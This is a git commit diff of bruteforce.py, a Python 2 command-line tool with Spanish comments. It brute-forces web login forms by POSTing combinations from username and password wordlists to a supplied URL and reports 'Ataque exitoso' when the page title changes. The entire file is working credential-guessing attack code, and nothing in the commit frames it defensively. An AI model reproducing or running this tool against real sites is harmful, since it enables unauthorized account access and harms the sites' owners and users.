97168a72aa5695bf77d793e4973808e666a8a054
root <root@debian>
2017-10-16 01:31:36 -0500

    BruteForce funcionando

--- bruteforce.py
+++ bruteforce.py
@@ -1,67 +1,153 @@
-import getopt
-import sys
-import  mechanize
-from bs4 import BeautifulSoup
-import urllib2
+#!/usr/bin/python
 
+import requests
+import argparse
+import sys
+from lxml.html import fromstring
+import os.path
 
 arg = ''
+url = ''
+userField = ''
+passField = ''
+user = ''
+pwd = ''
+	
 
-def bruteForce(arg):
-
+def bruteforce(url, userField, passField, user,pwd):
+	users = []
 	passwords = []
 	i = 0
 	j = 0
-
-	fo = open(arg, 'r')
-	for element in fo:
-		passwords.append(element)
-	fo.close()
-
-	for i in range(0,len(passwords)):
-		for j in range(0,len(passwords)):
-			url = 'http://localhost/ojs302/index.php/index/login'
-			br = mechanize.Browser()
-			br.open(url)
-			br.select_form(nr = 0 )
-			br.form['username'] = passwords[i]
-			br.form['password'] = passwords[j]
-			br.submit()
-			if url not in br.response().geturl():
-				print "Credenciales correctas: \n" + passwords[i] + passwords[j]
+	
+	if os.path.exists(pwd) and os.path.exists(user): # ambos archivos
+		
+		fo = open(user, 'r')
+		for element in fo:
+			users.append(element)
+		fo.close()
+		
+		fo = open(pwd, 'r')
+		for element in fo:
+			passwords.append(element)
+		fo.close()
+		
+		for i in range(0,len(users)):
+			for j in range (0,len(passwords)):
+				#Antes del ataque
+				rb = requests.post(url)
+				tree = fromstring(rb.content)
+				before = tree.findtext('.//title')
+		
 				
-				#print br.response().geturl()
+				#Login
+				payload = { userField : users[i], passField: passwords[j]}
+				r = requests.post(url, data= payload)
+	
+				#Login exitoso
+				tree = fromstring(r.content)
+				after =  tree.findtext('.//title')
+				
+				if before in after:
+					print 'Ataque no exitoso con:'  + "\nUser: " + users[i] + "Password: " + passwords[j]
+				else:
+					print "Ataque exitoso con:" + "\nUser: " + users[i]  + "Password: " + passwords[j]
+					
+				j + 1
+			i + 1
+		exit
 
-
-			j + 1
-		i + 1
-
-
-
+	
+	elif os.path.exists(user): #archivo con usuarios
+		print 'entra usr'
+		fo = open(user, 'r')
+		for element in fo:
+			users.append(element)
+		fo.close()
+		
+		for i in range(0,len(users)):
+		
+			#Antes del ataque
+			rb = requests.post(url)
+			tree = fromstring(rb.content)
+			before = tree.findtext('.//title')
+		
+			#Login
+			payload = { userField : users[i], passField: pwd}
+			r = requests.post(url, data= payload)
+	
+			#Login exitoso
+			tree = fromstring(r.content)
+			after =  tree.findtext('.//title')
+	
+			if before in after:
+				print 'Ataque no exitoso con:'  + "\nUser: " + users[i] + "Password: " + pwd
+			else:
+				print "Ataque exitoso con:" + "\nUser: " + users[i]  + "Password: " + pwd
+		exit
+		
+	elif os.path.exists(pwd): # Archivo con passwords
+		
+		fo = open(pwd, 'r')
+		for element in fo:
+			passwords.append(element)
+		fo.close()
+		
+		for i in range(0,len(passwords)):
+		
+			#Antes del ataque
+			rb = requests.post(url)
+			tree = fromstring(rb.content)
+			before = tree.findtext('.//title')
+		
+			#Login
+			payload = { userField : user, passField: passwords[i]}
+			r = requests.post(url, data= payload)
+	
+			#Login exitoso
+			tree = fromstring(r.content)
+			after =  tree.findtext('.//title')
+	
+			if before in after:
+				print 'Ataque no exitoso con:'  + "\nUser: " + user + "Password: " + passwords[i]
+			else:
+				print "Ataque exitoso con:" + "\nUser: " + user  + "Password: " + passwords[i]
+		exit
+	
+	else: # ambas variables
+		#Antes del ataque
+		rb = requests.post(url)
+		tree = fromstring(rb.content)
+		before = tree.findtext('.//title')
+	
+		#Login
+		payload = { userField : user, passField: pwd}
+		r = requests.post(url, data= payload)
+	
+		#Login exitoso
+		tree = fromstring(r.content)
+		after =  tree.findtext('.//title')
+		if before in after:
+			print 'Ataque no exitoso con:'  + "\nUser: " + user + " Password: " + pwd
+		else:
+			print "Ataque exitoso con:" + "\nUser: " + user  + " Password: " + pwd
+		exit
 
 def getParams(arg):
-	try:
-		opts, args = getopt.getopt(sys.argv[1:],'b:h', ['bruteforce=''help'])
-	except getopt.GetoptError:
-		help()
+	parser = argparse.ArgumentParser(description='Fuerza Bruta',
+		formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 
-	for opt, arg in opts:	
-		if opt in ('-b','--bruteforce'):
-			bf = arg
-			bruteForce(bf)
-	
-		
-		elif opt in ('-h','--help'):
-			print "prueba"
+	parser.add_argument('-b', '--bruteforce',
+	nargs=5,metavar=('url','CampoUsuario','CampoPass', 'Usuario', 'Password') ,help='help:')
 					
-		else:
-			print 'opcion no valida'
-			sys.exit(2)
-
-
+	
+	options = parser.parse_args()
+	
+	if len(sys.argv) == 1:
+		print parser.print_help()
+	
+	elif '-b' in sys.argv or '--bruteforce':
+		bruteforce(options.bruteforce[0],options.bruteforce[1],options.bruteforce[2],options.bruteforce[3], options.bruteforce[4])
+		
 getParams(arg)
-
-
-
-
 
